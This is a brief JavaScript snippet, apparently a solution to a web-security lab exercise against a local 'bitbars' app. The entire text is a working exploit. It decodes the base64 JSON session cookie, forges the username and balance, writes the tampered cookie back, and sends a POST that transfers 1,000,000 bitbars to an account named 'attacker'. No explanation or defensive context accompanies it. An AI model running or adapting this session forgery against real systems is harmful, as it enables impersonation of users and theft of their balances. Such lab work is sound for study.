let based = (document.cookie).substring(8)
let decoded = JSON.parse(atob(based))
decoded["account"]["username"] = "user1" 
decoded["account"]["bitbars"] = 20000000
let new_cookie = btoa(JSON.stringify(decoded))
document.cookie = `session=${new_cookie}`
await fetch("http://localhost:3000/post_transfer", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    },
    "referrer": "http://localhost:3000/transfer",
    "body": "destination_username=attacker&quantity=1000000",
    "method": "POST",
    "mode": "cors"
});
